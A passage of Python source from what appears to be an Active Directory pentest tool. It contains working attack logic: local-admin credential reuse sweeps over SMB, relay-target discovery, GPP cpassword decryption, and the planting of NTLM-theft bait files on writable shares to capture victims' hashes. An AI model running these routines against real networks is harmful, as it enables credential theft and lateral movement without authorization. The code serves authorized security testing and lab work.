) -> list[Any]:
    """Probe local-account credential reuse across hosts via native aiosmb.

    Each per-host config authenticates in LOCAL-auth mode: the credential domain
    is set to the target host itself, so the DC is never consulted and a wrong
    credential can only ever touch a per-machine local SAM (domain-lockout safe).
    ``use_kerberos=False`` because a local SAM account has no Kerberos TGT.

    Returns one ``SMBPrivilegeResult`` per host (ADMIN == netexec ``Pwn3d!``).
    Never raises — the underlying batch maps failures to result statuses.
    """
    from adscan_internal.services.smb_access_probe_service import (  # noqa: PLC0415
        get_smb_probe_worker_count,
    )
    from adscan_internal.services.smb_privilege import (  # noqa: PLC0415
        SMBPrivilegeConfig,
        check_smb_privilege_batch,
    )

    if not hosts:
        return []

    configs = [
        SMBPrivilegeConfig(
            target_ip=host,
            # Local-auth: credential domain == the target host → local SAM
            # validation, never a domain bind (no domain-account lockout risk).
            domain=host,
            username=username,
            password=None if is_hash else credential,
            nt_hash=credential if is_hash else None,
            use_kerberos=False,
            timeout=timeout,
        )
        for host in hosts
    ]
    workers = max(1, min(max_workers or get_smb_probe_worker_count(), len(configs)))
    return await check_smb_privilege_batch(configs, max_concurrency=workers)


def _synthesize_local_cred_reuse_output(results: Any) -> str:
    """Render native local-auth results as NetExec-style SMB log lines.

    ``PentestShell.execute_local_cred_reuse`` parses NetExec ``smb`` output via
    :func:`parse_local_cred_reuse_targets` / :func:`parse_local_cred_reuse_outcomes`.
    Emitting the same textual shape lets the native sweep reuse that untouched
    persistence / attack-graph / panel logic. Only the target columns and the
    ``(Pwn3d!)`` / ``STATUS_*`` markers the parsers key on are reproduced — the
    captured credential is never written into the synthesized line.
    """
    from adscan_internal.services.smb_privilege import (  # noqa: PLC0415
        SMBPrivilegeStatus,
    )

    lines: list[str] = []
    for result in results or []:
        ip = str(getattr(result, "target_ip", "") or "").strip()
        host = str(getattr(result, "target_hostname", "") or "").strip() or ip
        user = str(getattr(result, "username", "") or "").strip()
        if not ip and not host:
            continue
        account = f"{host}\\{user}" if host else user
        status = getattr(result, "status", None)
        if status == SMBPrivilegeStatus.ADMIN:
            lines.append(f"SMB  {ip}  445  {host}  [+] {account} (Pwn3d!)")
        elif status == SMBPrivilegeStatus.NOT_ADMIN:
            lines.append(f"SMB  {ip}  445  {host}  [+] {account}")
        elif status == SMBPrivilegeStatus.AUTH_FAILED:
            code_match = _LOCAL_REUSE_FAILURE_CODE_RE.search(
                str(getattr(result, "error", "") or "")
            )
            code = code_match.group("code") if code_match else "STATUS_LOGON_FAILURE"
            lines.append(f"SMB  {ip}  445  {host}  [-] {account} {code}")
        else:  # UNREACHABLE / ERROR
            lines.append(f"SMB  {ip}  445  {host}  [-] {account} Connection Error")
    return ("\n".join(lines) + "\n") if lines else ""


_LOCAL_REUSE_IPV4_RE = re.compile(r"\b(?:\d{1,3}\.){3}\d{1,3}\b")
_LOCAL_REUSE_SMB_LINE_RE = re.compile(
    r"^\s*SMB\s+(?P<target>\S+)\s+\d+\s+(?P<host>[A-Za-z0-9_.-]+)\s+\[(?P<status>[^\]]+)\]\s+(?P<rest>.*)$"
)
_LOCAL_REUSE_FAILURE_CODE_RE = re.compile(
    r"\b(?P<code>(?:STATUS|NT_STATUS|KDC_ERR)_[A-Z0-9_]+)\b"
)


def parse_local_cred_reuse_targets(log_text: str) -> list[dict[str, str]]:
    """Parse NetExec local-auth output and return successful local-admin targets."""
    if not log_text:
        return []

    seen: set[tuple[str, str, str]] = set()
    targets: list[dict[str, str]] = []

    for raw_line in log_text.splitlines():
        line = strip_ansi_codes(raw_line)
        parsed = _LOCAL_REUSE_SMB_LINE_RE.match(line)
        if not parsed and "SMB " in line:
            smb_idx = line.find("SMB ")
            if smb_idx > 0:
                parsed = _LOCAL_REUSE_SMB_LINE_RE.match(line[smb_idx:])
        if not parsed:
            continue
        rest = str(parsed.group("rest") or "")
        # Keep only confirmed local admin sessions.
        if "(pwn3d" not in rest.lower():
            continue

        target = str(parsed.group("target") or "").strip()
        hostname = str(parsed.group("host") or "").strip()
        ip_match = _LOCAL_REUSE_IPV4_RE.search(target)
        ip = ip_match.group(0) if ip_match else ""
        if not ip:
            ip_match = _LOCAL_REUSE_IPV4_RE.search(rest)
            ip = ip_match.group(0) if ip_match else ""

        dedupe_key = (target.lower(), hostname.lower(), ip.lower())
        if dedupe_key in seen:
            continue
        seen.add(dedupe_key)
        targets.append(
            {
                "target": target,
                "hostname": hostname,
                "ip": ip,
            }
        )

    return targets


def parse_local_cred_reuse_outcomes(log_text: str) -> dict[str, int]:
    """Parse NetExec local-auth output and summarize non-Pwn3d outcomes.

    The result helps explain why potential reuse candidates were filtered out
    during active validation (for example `STATUS_ACCOUNT_DISABLED`,
    `STATUS_LOGON_FAILURE`, `KDC_ERR_C_PRINCIPAL_UNKNOWN`).
    """
    if not log_text:
        return {}

    counts: Counter[str] = Counter()
    for raw_line in log_text.splitlines():
        line = strip_ansi_codes(raw_line)
        parsed = _LOCAL_REUSE_SMB_LINE_RE.match(line)
        if not parsed and "SMB " in line:
            smb_idx = line.find("SMB ")
            if smb_idx > 0:
                parsed = _LOCAL_REUSE_SMB_LINE_RE.match(line[smb_idx:])
        if not parsed:
            continue

        rest = str(parsed.group("rest") or "").strip()
        if not rest:
            continue
        if "(pwn3d" in rest.lower():
            counts["PWN3D"] += 1
            continue

        failure = _LOCAL_REUSE_FAILURE_CODE_RE.search(rest)
        if failure:
            counts[str(failure.group("code")).upper()] += 1
            continue
        if "Connection Error" in rest:
            counts["CONNECTION_ERROR"] += 1
            continue
        counts["OTHER_FAILURE"] += 1

    return dict(counts)


def _collect_unsigned_relay_from_graph(shell: Any, *, domain: str) -> list[str] | None:
    """Return hosts with SMB signing NOT required from the collector graph.

    The native SMB collector's negotiate persists ``smb_signing_required`` per
    Computer node; a relay target is a host where that is ``False``. Prefer this
    already-collected posture over a fresh probe. Returns ``None`` when no host
    inventory carries signing posture yet (graph missing / no Computer node has
    an ``smb_signing_required`` property), so the caller falls back to a live sweep.
    """
    from adscan_internal.services.attack_graph_service import load_attack_graph

    graph = load_attack_graph(shell, domain)
    nodes = graph.get("nodes") if isinstance(graph, dict) else None
    if not isinstance(nodes, dict):
        return None

    unsigned: list[str] = []
    probed_any = False
    for node in nodes.values():
        if not isinstance(node, dict):
            continue
        if str(node.get("kind") or "").strip().lower() != "computer":
            continue
        props = node.get("properties")
        props = props if isinstance(props, dict) else {}
        signing_required = props.get("smb_signing_required")
        if signing_required is None:
            continue  # this host was not SMB-probed by the collector
        probed_any = True
        if signing_required is False:
            host = str(node.get("name") or props.get("samaccountname") or "").strip()
            if host:
                unsigned.append(host)

    if not probed_any:
        return None
    return unsigned


async def _probe_unsigned_relay_hosts(
    hosts: list[str], *, timeout: float = 10.0, concurrency: int = 64
) -> list[str]:
    """Return the hosts whose SMB signing is NOT required (relay-able).

    Native bounded-concurrency sweep using ``smb_collector.negotiate_only`` (the
    unauthenticated negotiate that reports ``smb_signing_required``) — the same
    signal NetExec ``--gen-relay-list`` keyed on, with no subprocess. A host that
    errors or does not report signing posture is treated as NOT relay-able
    (conservative: never emit a target we could not confirm is unsigned).
    """
    import asyncio

    from adscan_internal.services.collector.smb_collector import negotiate_only

    sem = asyncio.Semaphore(concurrency)

    async def _one(host: str) -> str | None:
        async with sem:
            try:
                props = await negotiate_only(host, 445, int(timeout))
            except Exception:  # noqa: BLE001 — unreachable/errored host is not a target
                return None
            if props and props.get("smb_signing_required") is False:
                return host
            return None

    results = await asyncio.gather(*[_one(h) for h in hosts])
    return [h for h in results if h]


def run_smb_relay_targets(shell: Any, *, domain: str) -> None:
    """Enumerate SMB relay targets (hosts with unsigned SMB) via native negotiate."""
    from adscan_internal.rich_output import mark_sensitive

    marked_domain = mark_sensitive(domain, "domain")
    workspace_dir = getattr(shell, "current_workspace_dir", None) or os.getcwd()
    scope_preference = resolve_domain_service_scope_preference(
        shell,
        workspace_dir=workspace_dir,
        domains_dir=shell.domains_dir,
        domain=domain,
        service="smb",
        domain_data=shell.domains_data.get(domain, {}),
        prompt_title="Choose the target scope for SMB multi-host checks:",
    )
    targets_file, source = resolve_domain_service_target_file(
        workspace_dir,
        shell.domains_dir,
        domain,
        service="smb",
        domain_data=shell.domains_data.get(domain, {}),
        scope_preference=scope_preference,
    )
    if not targets_file:
        print_error(f"No host targets are available for domain {marked_domain}.")
        return
    targeting_notice = consume_service_targeting_fallback_notice(
        shell,
        workspace_dir=workspace_dir,
        domains_dir=shell.domains_dir,
        domain=domain,
        service="smb",
        source=source,
    )
    if targeting_notice:
        print_info(targeting_notice)
    print_info_debug(
        f"[smb] using domain target file source={source} "
        f"for {marked_domain}: {mark_sensitive(targets_file, 'path')}"
    )
    print_info(
        f"SMB relay scope: {mark_sensitive(source, 'detail')} "
        f"({count_target_file_entries(targets_file)} target(s))"
    )

    username = shell.domains_data.get(shell.domain, {}).get("username", "N/A")
    print_operation_header(
        "SMB Relay Target Enumeration",
        details={
            "Domain": domain,
            "Username": username,
            "Protocol": "SMB",
            "Target": "Hosts with unsigned SMB",
            "Method": "Native SMB negotiate (signing posture)",
            "Output": f"domains/{domain}/smb/relay_targets.txt",
        },
        icon="🎯",
    )

    # Prefer the SMB signing posture the native collector already gathered
    # (smb_signing_required per Computer node); only fall back to a live negotiate
    # sweep over the resolved targets when no host inventory carries it yet.
    unsigned = _collect_unsigned_relay_from_graph(shell, domain=domain)
    if unsigned is None:
        from adscan_internal.services.async_bridge import run_async_sync

        hosts = list(load_target_entries(targets_file))
        unsigned = run_async_sync(_probe_unsigned_relay_hosts(hosts))
    relay_file = os.path.join(shell.domains_dir, domain, "smb", "relay_targets.txt")
    os.makedirs(os.path.dirname(relay_file), exist_ok=True)
    with open(relay_file, "w", encoding="utf-8") as handle:
        if unsigned:
            handle.write("\n".join(unsigned) + "\n")
    shell.execute_generate_relay_list(domain)


def run_get_flags(
    shell: Any,
    *,
    domain: str,
    username: str,
    password: str,
    secret_kind: str | None = None,
) -> None:
    """Obtain HTB/THM flags via the native aiosmb byte-read path.

    Falls back to the :mod:`remote_exec` cascade only when SMB returns
    ACCESS_DENIED for a candidate Desktop file.
    """
    # Best-effort clock sync — Kerberos byte-reads need it; the call is
    # idempotent and harmless when the clock is already aligned.
    try:
        shell.do_sync_clock_with_pdc(domain)
    except Exception:  # noqa: BLE001
        pass

    pdc_hostname = shell.domains_data[domain].get("pdc_hostname") or ""
    pdc_fqdn = (
        pdc_hostname + "." + domain
        if pdc_hostname
        else (shell.domains_data[domain].get("pdc") or domain)
    )

    from adscan_internal.cli.flags import execute_get_flags
    from adscan_internal.rich_output import mark_sensitive

    marked_domain = mark_sensitive(domain, "domain")
    print_info(f"Obtaining flags from domain {marked_domain}")
    execute_get_flags(
        shell,
        domain=domain,
        host=pdc_fqdn,
        username=username,
        password=password,
        secret_kind=secret_kind,
    )


_GPP_WALKER_DESCRIPTION = (
    "Walks SYSVOL + NETLOGON + FRS staging shares (Replication, "
    "SYSVOL_DFSR, NtFrs) on every DC of the domain. Decrypts GPP cpassword "
    "entries via the Microsoft static AES-256 key (no impacket subprocess) "
    "and parses Registry.xml DefaultPassword for autologon credentials."
)


def _gpp_confirm_context(shell: Any, *, domain: str) -> dict[str, str]:
    """Common context block for the GPP confirm panels.

    Surfaces the actual scope the native walker will use — multi-DC,
    multi-share — so the operator sees what is about to be queried, not
    the legacy NetExec module label.
    """
    from adscan_internal.rich_output import mark_sensitive

    auth_type = shell.domains_data[domain]["auth"]
    session_type_display = {
        "unauth": "Null Session (Unauthenticated)",
        "auth": "Authenticated Session",
        "pwned": "Administrative Session",
        "with_users": "With Users",
    }.get(auth_type, auth_type.capitalize())

    targets = _resolve_dc_targets_for_gpp(shell, domain)
    pdc = shell.domains_data.get(domain, {}).get("pdc", "N/A")
    targets_display = (
        ", ".join(mark_sensitive(t, "ip") for t in targets) if targets else pdc
    )

    return {
        "Domain": mark_sensitive(domain, "domain"),
        "Targets": targets_display,
        "Shares": "SYSVOL, NETLOGON, Replication, SYSVOL_DFSR, NtFrs",
        "Session Type": session_type_display,
        "Engine": "native_gpp_walker (cpassword + autologon)",
    }


def run_ask_for_smb_gpp(shell: Any, *, domain: str) -> None:
    """Prompt user to search for Group Policy Preferences files.

    Args:
        shell: Shell instance with domain data and helper methods.
        domain: Domain name.
    """
    from adscan_internal.rich_output import confirm_operation
    from adscan_internal.services.scan_phases import subphase_is_enabled

    if not subphase_is_enabled(shell, "quick_credential_wins", "gpp_autologin"):
        print_info("GPP autologin search skipped (disabled in scan configuration).")
        return

    if shell.auto:
        run_gpp_autologin(shell, target_domain=domain)
        return

    if confirm_operation(
        operation_name="GPP Credential Hunt",
        description=_GPP_WALKER_DESCRIPTION,
        context=_gpp_confirm_context(shell, domain=domain),
    ):
        run_gpp_autologin(shell, target_domain=domain)


def run_ask_for_smb_gpp_autologin(shell: Any, *, domain: str) -> None:
    """Prompt user to run the native GPP autologon walker."""
    from adscan_internal.rich_output import confirm_operation
    from adscan_internal.services.scan_phases import (
        phase_is_enabled,
        subphase_is_enabled,
    )

    if not phase_is_enabled(shell, "quick_credential_wins"):
        return
    if not subphase_is_enabled(shell, "quick_credential_wins", "gpp_autologin"):
        print_info("GPP autologin search skipped (disabled in scan configuration).")
        return

    if shell.auto:
        run_gpp_autologin(shell, target_domain=domain)
        return

    if confirm_operation(
        operation_name="GPP Autologon Hunt",
        description=_GPP_WALKER_DESCRIPTION,
        context=_gpp_confirm_context(shell, domain=domain),
    ):
        run_gpp_autologin(shell, target_domain=domain)


def run_ask_for_smb_gpp_passwords(shell: Any, *, domain: str) -> None:
    """Prompt user to run the native GPP cpassword walker."""
    from adscan_internal.rich_output import confirm_operation
    from adscan_internal.services.scan_phases import (
        phase_is_enabled,
        subphase_is_enabled,
    )

    if not phase_is_enabled(shell, "quick_credential_wins"):
        return
    if not subphase_is_enabled(shell, "quick_credential_wins", "gpp_passwords"):
        print_info("GPP password search skipped (disabled in scan configuration).")
        return

    if shell.auto:
        run_gpp_passwords(shell, target_domain=domain)
        return

    if confirm_operation(
        operation_name="GPP cpassword Hunt",
        description=_GPP_WALKER_DESCRIPTION,
        context=_gpp_confirm_context(shell, domain=domain),
    ):
        run_gpp_passwords(shell, target_domain=domain)


def run_gpp_passwords_share(
    shell: Any,
    *,
    domain: str,
    username: str,
    password: str,
    share: str,
) -> None:
    """Enumerate GPP passwords on a specific share using Impacket Get-GPPPassword.py."""
    if username == "null":
        auth = shell.build_auth_impacket("", "", domain)
    else:
        auth = shell.build_auth_impacket(username, password, domain)

    if not shell.impacket_scripts_dir:
        print_error(
            "Impacket scripts directory not configured. Please ensure Impacket is installed via 'adscan install'."
        )
        return

    gpp_path = os.path.join(shell.impacket_scripts_dir, "Get-GPPPassword.py")
    if not os.path.isfile(gpp_path) or not os.access(gpp_path, os.X_OK):
        print_error(
            f"Get-GPPPassword.py not found or not executable in {shell.impacket_scripts_dir}. Please check Impacket installation."
        )
        return

    marked_share = mark_sensitive(share, "service")
    marked_domain = mark_sensitive(domain, "domain")
    command = f"{gpp_path} {auth} -share {marked_share}"

    print_info(
        f"Searching for Groups XML files in share {marked_share} of domain {marked_domain}"
    )

    try:
        completed_process = run_raw_impacket_command(
            command,
            script_name="Get-GPPPassword.py",
            timeout=300,
            command_runner=RunCommandAdapter(shell.run_command),
        )
        if completed_process is None:
            print_error("Error executing Get-GPPPassword.py.")
            return
    except Exception as e:  # pylint: disable=broad-except
        telemetry.capture_exception(e)
        print_error("Error executing Get-GPPPassword.py.")
        print_exception(show_locals=False, exception=e)
        return

    output = completed_process.stdout or ""
    lines = output.splitlines()

    # Parse GPP credential entries
    entries: list[dict[str, str]] = []
    for idx, line in enumerate(lines):
        if "found a groups xml file" in line.lower():
            entry: dict[str, str] = {}
            # Parse subsequent lines for key: value
            for subline in lines[idx + 1 :]:
                if ":" not in subline:
                    break
                # Remove any leading log prefix "[*]" and whitespace
                cleaned = re.sub(r"^\[\*\]\s*", "", subline).strip()
                key, val = cleaned.split(":", 1)
                entry[key.strip()] = val.strip()
            if "userName" in entry and "password" in entry:
                entries.append(entry)

    if not entries:
        marked_share = mark_sensitive(share, "service")
        marked_domain = mark_sensitive(domain, "domain")
        print_info(
            f"No Groups XML files found in share {marked_share} of domain {marked_domain}"
        )
    else:
        # Display found credentials in a Rich table
        table = Table(
            title=f"[bold cyan]GPP Credentials found in {share} share[/bold cyan]",
            header_style="bold magenta",
            box=rich.box.SIMPLE,
        )
        table.add_column("Domain", style="cyan")
        table.add_column("User", style="magenta")
        table.add_column("Password", style="green")

        for entry in entries:
            full_user = entry["userName"]
            # Split domain and username from userName
            parts = full_user.rsplit("\\", 1)
            if len(parts) == 2:
                dom, usr = parts
            else:
                dom = domain
                usr = full_user
            pwd = entry.get("password", "")
            marked_dom = mark_sensitive(dom, "domain")
            marked_usr = mark_sensitive(usr, "user")
            marked_pwd = mark_sensitive(pwd, "password")
            table.add_row(marked_dom, marked_usr, marked_pwd)
            # Store credential
            shell.add_credential(dom, usr, pwd, credential_origin="gpppassword")

        print_panel_with_table(table, border_style=BRAND_COLORS["info"])

    if completed_process.returncode != 0:
        error_msg = (
            completed_process.stderr.strip()
            if completed_process.stderr
            else "Details not available"
        )
        print_error(f"Error executing Get-GPPPassword.py: {error_msg}")


def run_smbclient_upload(
    shell: Any,
    *,
    domain: str,
    shares: list[str],
    username: str,
    password: str,
    hosts: list[str],
) -> None:
    """Upload generated NTLM capture files to writable SMB shares using smbclient."""
    from adscan_internal.services import ExploitationService

    workspace_cwd = shell._get_workspace_cwd()
    smb_log_dir = domain_path(
        workspace_cwd, shell.domains_dir, domain, shell.smb_dir, "smb_log"
    )
    smb_log_dir_rel = domain_relpath(
        shell.domains_dir, domain, shell.smb_dir, "smb_log"
    )
    if not os.path.exists(smb_log_dir):
        print_error(f"Directory {smb_log_dir_rel} not found")
        return

    service = ExploitationService()
    poisoning_started = False

    # Iterate over each host
    for host in hosts:
        marked_host = mark_sensitive(host, "hostname")
        print_info(f"Processing host: {marked_host}")
        # Iterate over each share for the current host
        for share in shares:
            marked_share = mark_sensitive(share, "service")
            print_info(f"Uploading files to share {marked_share}")

            result = service.smb.upload_files_to_share(
                host=host,
                share=share,
                username=username,
                password=password,
                files_dir=smb_log_dir,
                scan_id=None,
            )

            if result.success:
                marked_share = mark_sensitive(share, "service")
                marked_host = mark_sensitive(host, "hostname")
                print_success(
                    f"Files uploaded successfully to {marked_share} on {marked_host}"
                )
                # Start the native poisoning suite on first successful upload so that
                # whoever opens the lured file authenticates back to our SMB capture.
                if not poisoning_started:
                    shell.do_poisoning("")
                    poisoning_started = True
            else:
                marked_share = mark_sensitive(share, "service")
                marked_host = mark_sensitive(host, "hostname")
                error_msg = result.error_message or "Details not available"
                print_error(
                    f"Error uploading files to {marked_share} on {marked_host}: {error_msg}"
                )


def run_ntlm_theft(
    shell: Any,
    *,
    domain: str,
    completion_event: threading.Event | None = None,
) -> None:
    """Generate NTLM theft files using the service layer.

    Args:
        shell: Shell instance with domain data and helper methods.
        domain: Domain name for NTLM theft operation.
        completion_event: Optional threading event to signal when generation completes.
    """
    from adscan_internal.services import ExploitationService

    if not shell.myip:
        print_error("MyIP must be configured before generating files")
        if completion_event:
            completion_event.set()
        return

    # Import TOOLS_INSTALL_DIR from CLI tooling helpers
    from adscan_internal.cli.tools_env import TOOLS_INSTALL_DIR

    ntlm_theft_path = os.path.join(TOOLS_INSTALL_DIR, "ntlm_theft", "ntlm_theft.py")
    workspace_cwd = shell._get_workspace_cwd()
    output_log_dir = domain_path(
        workspace_cwd, shell.domains_dir, domain, shell.smb_dir, "smb_log"
    )
    output_log_dir_rel = domain_relpath(
        shell.domains_dir, domain, shell.smb_dir, "smb_log"
    )

    print_info("Generating files for NTLM capture")

    service = ExploitationService()
    result = service.smb.generate_ntlm_theft_files(
        ntlm_theft_path=ntlm_theft_path,
        capture_ip=shell.myip,
        output_dir=output_log_dir,
        scan_id=None,
    )

    if result.success:
        print_success(f"Files generated successfully in {output_log_dir_rel}")
    else:
        error_msg = result.error_message or "Details not available"
        print_error(f"Error generating files with ntlm_theft: {error_msg}")

    if completion_event:
        completion_event.set()


def run_ask_for_smb_shares_write(
    shell: Any,
    *,
    domain: str,
    shares: list[str],
    username: str,
    password: str,
    hosts: list[str],
) -> None:
    """Prompt user to upload NTLM capture files to writable shares.

    Args:
        shell: Shell instance with domain data and helper methods.
        domain: Domain name.
        shares: List of share names to upload to.
        username: Username for authentication.
        password: Password for authentication.
        hosts: List of hostnames/IPs to upload to.
    """
    import threading
    from adscan_internal.rich_output import confirm_operation

    pdc = shell.domains_data.get(domain, {}).get("pdc", "N/A")
    num_shares = len(shares) if isinstance(shares, list) else "Multiple"
    share_list = (
        ", ".join(shares[:3])
        if isinstance(shares, list) and len(shares) <= 3
        else f"{num_shares} shares"
    )

    if confirm_operation(
        operation_name="Upload NTLM Capture Files",
        description="Uploads malicious files to writable shares to capture NTLM hashes",
        context={
            "Domain": domain,
            "PDC": pdc,
            "Username": username,
            "Target Shares": share_list,
            "Files": "NTLM theft payloads (SCF, URL, LNK)",
            "Capture IP": shell.myip if shell.myip else "N/A",
        },
        default=True,
        icon="📤",
        show_panel=True,
    ):
        # Create an event to signal when ntlm_theft finishes
        ntlm_completed = threading.Event()

        def process_uploads():
            # Wait for ntlm_theft to finish before continuing
            ntlm_completed.wait()
            run_smbclient_upload(
                shell,
                domain=domain,
                shares=shares,
                username=username,
                password=password,
                hosts=hosts,
            )

        # Start ntlm_theft with the event
        run_ntlm_theft(shell, domain=domain, completion_event=ntlm_completed)
        # Start smbclient in another thread that waits for the signal
        upload_thread = threading.Thread(target=process_uploads, daemon=True)
        upload_thread.start()


def _graph_acl_implies_read(view: Any) -> bool:
    """True when the graph ACL records any READ/WRITE/FULL_CONTROL permission.

    Used to surface NTFS-unverified share-ACL leads: the share ACL grants read
    to some principal but the collector could not confirm it against the NTFS
    folder ACL (``share_acl_only`` tier).
    """
    graph_acl = getattr(view, "graph_acl", None)
    if graph_acl is None:
        return False
    for principal in getattr(graph_acl, "principals", []) or []:
        perms = getattr(principal, "permissions", []) or []
        if any(p in ("READ", "WRITE", "FULL_CONTROL") for p in perms):
            return True
    return False


def _offer_share_credential_hunt(
    shell: Any,
    *,
    domain: str,
    username: str,
    credential: str,
    view_set: Any,
) -> None:
    """Offer credential hunt (rclone + credsweeper) when readable/writable shares exist.

    Central hook called after every native share enumeration so all paths
    (authenticated, null session, guest, attack-path followup) get the same
    post-enum credential-search UX that the legacy nxc path provided via
    ``execute_netexec_shares``.
    """
    if view_set is None:
        return
    host = getattr(view_set, "host", "") or ""
    views = getattr(view_set, "views", []) or []

    readable_names: list[str] = []
    share_map_entry: dict[str, str] = {}
    ntfs_unverified: list[str] = []  # graph-only leads, NTFS-unverified
    for v in views:
        is_write = any(
            p in getattr(v, "live_permissions", [])
            for p in ("WRITE", "WRITE_DAC", "FULL_CONTROL")
        )
        is_read = getattr(v, "is_readable_live", False)
        # Hunting needs effective READ. Live access IS effective access (the
        # operator's own token already passed share ∩ NTFS), so a live read is
        # always a confirmed candidate. For shares with no live signal we fall
        # back to the collector's graph verification: only ``ntfs_computed``
        # graph reads are treated as confirmed; ``share_acl_only`` graph reads
        # are a real lead but NTFS-unverified, so we deprioritize and flag
        # them rather than treat them as confirmed.
        graph_confirms_read = (
            not is_read
            and not is_write
            and getattr(v, "is_graph_ntfs_verified", False)
            and getattr(v, "has_graph", False)
        )
        if is_read or is_write:
            readable_names.append(v.name)
            # Store the full permission picture so the rclone download
            # selector (which filters on "read") doesn't skip shares that
            # are only writable — WRITE access implies READ on Windows.
            if is_read and is_write:
                share_map_entry[v.name] = "READ_WRITE"
            elif is_write:
                share_map_entry[v.name] = "READ_WRITE"  # WRITE implies READ
            else:
                share_map_entry[v.name] = "READ"
        elif graph_confirms_read:
            readable_names.append(v.name)
            share_map_entry[v.name] = "READ"
        elif (
            getattr(v, "has_graph", False)
            and not getattr(v, "is_graph_ntfs_verified", False)
            and _graph_acl_implies_read(v)
        ):
            # Share-ACL grants read but the NTFS folder ACL was not verified —
            # keep it as a deprioritized, flagged lead (not a confirmed read).
            ntfs_unverified.append(v.name)

    if ntfs_unverified:
        print_warning(
            "NTFS-unverified share lead(s) on "
            f"{mark_sensitive(host, 'hostname')} (share-ACL grants read but the "
            "NTFS folder ACL was not confirmed — effective access may be lower): "
            + ", ".join(mark_sensitive(n, "text") for n in ntfs_unverified)
        )

    # Loot (READ) and bait (WRITE) are independent post-enum opportunities. Both
    # are slow and intrusive in different ways (loot is 4 sequential phases;
    # bait writes a file and waits for a victim), so the operator chooses WHICH
    # actions to run AND in WHAT ORDER through a single ordered action menu —
    # full control over one action, both in any order, or neither. The
    # individual executors below are reused unchanged.
    ask = getattr(shell, "ask_for_smb_shares_read", None)
    can_hunt = bool(readable_names) and callable(ask)
    has_writable = any(
        getattr(v, "is_writable_live", False) and getattr(v, "name", "")
        for v in views
    )

    action_hunt = "Search readable shares for credentials"
    action_bait = "Drop NTLMv2 capture bait on writable shares"

    available_actions: list[str] = []
    if can_hunt:
        available_actions.append(action_hunt)
    if has_writable:
        available_actions.append(action_bait)

    if not available_actions:
        return

    def _run_hunt() -> None:
        ask(
            domain,
            readable_names,
            username,
            credential,
            [host],
            share_map={host: share_map_entry},
        )

    def _run_bait() -> None:
        # The bait executor itself auto-skips in non-interactive mode (defense
        # in depth) — it will NEVER drop a file or block in ``adscan ci`` even
        # if the CI default order includes this action.
        _offer_ntlmv2_share_drop_capture(
            shell,
            domain=domain,
            username=username,
            credential=credential,
            host=host,
            views=views,
        )

    runners = {action_hunt: _run_hunt, action_bait: _run_bait}

    # CI auto-resolve order: loot (READ, read-only) first, bait (WRITE) second.
    # Loot is safe to auto-run unattended; the bait executor still no-ops in CI.
    default_order = [action_hunt, action_bait]
    chosen = questionary_ordered_selection(
        title=(
            f"Post-enum share actions on {mark_sensitive(host, 'hostname')} — "
            "pick actions in the order to run them"
        ),
        options=available_actions,
        default_order=default_order,
        shell=shell,
    )

    for action in chosen:
        runner = runners.get(action)
        if runner is not None:
            runner()


def _ntlm_bait_writable_share_views(views: Any) -> list[Any]:
    """Return the live, MxAc-verified writable share views (dedup by name)."""
    writable: list[Any] = []
    seen: set[str] = set()
    for v in views or []:
        name = str(getattr(v, "name", "") or "").strip()
        if not name or not getattr(v, "is_writable_live", False):
            continue
        if name in seen:
            continue
        seen.add(name)
        writable.append(v)
    return writable


#: Folder-name substrings that strongly suggest a "users browse here / drop here"
#: location. Used ONLY to PRE-SELECT (never to filter) in the audit interactive
#: flow — the operator can always change the selection. Case-insensitive.
_NTLM_BAIT_BROWSE_HINT_TOKENS = (
    "transfer",
    "incoming",
    "inbound",
    "upload",
    "uploads",
    "public",
    "shared",
    "dropbox",
    "drop",
    "scans",
    "scan",
    "it",
    "exchange",
    "temp",
    "tmp",
    "pub",
    "data",
)


def _ntlm_bait_target_label(share: str, directory_path: str) -> str:
    """Human label for a (share, folder) drop target — ``share`` or ``share\\dir``."""
    rel = str(directory_path or "").strip().strip("\\")
    return f"{share}\\{rel}" if rel else f"{share}\\  (root)"


def _ntlm_bait_is_browse_likely(directory_path: str) -> bool:
    """True when the folder name matches a browse-likely heuristic token.

    The share root ("") is NOT browse-likely by this heuristic (users open a
    sub-folder, not the share root) — so audit leaves root unselected by default.
    """
    rel = str(directory_path or "").strip().strip("\\")
    if not rel:
        return False
    leaf = rel.rsplit("\\", 1)[-1].lower()
    return any(token in leaf for token in _NTLM_BAIT_BROWSE_HINT_TOKENS)


def _enumerate_ntlm_bait_targets(
    *,
    writable_share_names: list[str],
    target_host: str,
    creds: dict[str, Any],
    domain: str,
) -> list[Any]:
    """Enumerate writable (share, folder) drop targets across writable shares.

    Granular per-folder enumeration (Part 1): for each writable share, MxAc-walk
    its directory tree (bounded depth + folder cap, read-only) and collect the
    folders — including the root — where the current token has effective WRITE.
    Returns a list of ``DropTarget`` (share, directory_path). Bounded and
    non-intrusive per adscan-ad-constraints § 10.
    """
    from adscan_internal.services.post_exploitation.ntlmv2_share_capture_service import (  # noqa: PLC0415
        DropTarget,
    )
    from adscan_internal.services.smb_effective_access_service import (  # noqa: PLC0415
        enumerate_writable_directories,
    )

    username = str(creds.get("username") or "").strip()
    password = creds.get("nt_hash") or creds.get("password") or ""
    nt_hash = str(creds.get("nt_hash") or "") or None
    auth_domain = str(creds.get("auth_domain") or domain or "").strip()

    targets: list[Any] = []
    for share in writable_share_names:
        try:
            enumeration = enumerate_writable_directories(
                host=target_host,
                share=share,
                username=username or None,
                password=password if isinstance(password, str) else None,
                nt_hash=nt_hash,
                auth_domain=auth_domain or None,
                domain=domain,
            )
        except Exception as exc:  # noqa: BLE001 — enumeration must never break the offer
            telemetry.capture_exception(exc)
            print_info_debug(
                f"ntlmv2-share-capture: writable-folder enumeration failed on "
                f"{mark_sensitive(share, 'share')}: {exc}. Falling back to root drop."
            )
            targets.append(DropTarget(share=share, directory_path=""))
            continue

        if enumeration.hit_cap and enumeration.skipped:
            print_warning(
                f"[~] Folder enumeration on {mark_sensitive(share, 'share')} hit the "
                f"safety cap — {len(enumeration.skipped)} folder(s) were NOT probed "
                "for write access and are excluded from targeting."
            )

        if enumeration.writable_paths:
            for rel in enumeration.writable_paths:
                targets.append(DropTarget(share=share, directory_path=rel))
        elif not enumeration.succeeded:
            # MxAc undetermined — the share itself was already gated as writable
            # upstream, so keep the root as a target (the upload is the test).
            targets.append(DropTarget(share=share, directory_path=""))
    return targets


def _render_ntlm_bait_targets_panel(targets: list[Any], target_host: str) -> None:
    """Premium panel listing the writable (share, folder) drop candidates.

    Solves operator visibility of the browse-likely sub-folder (e.g. ``transfer``):
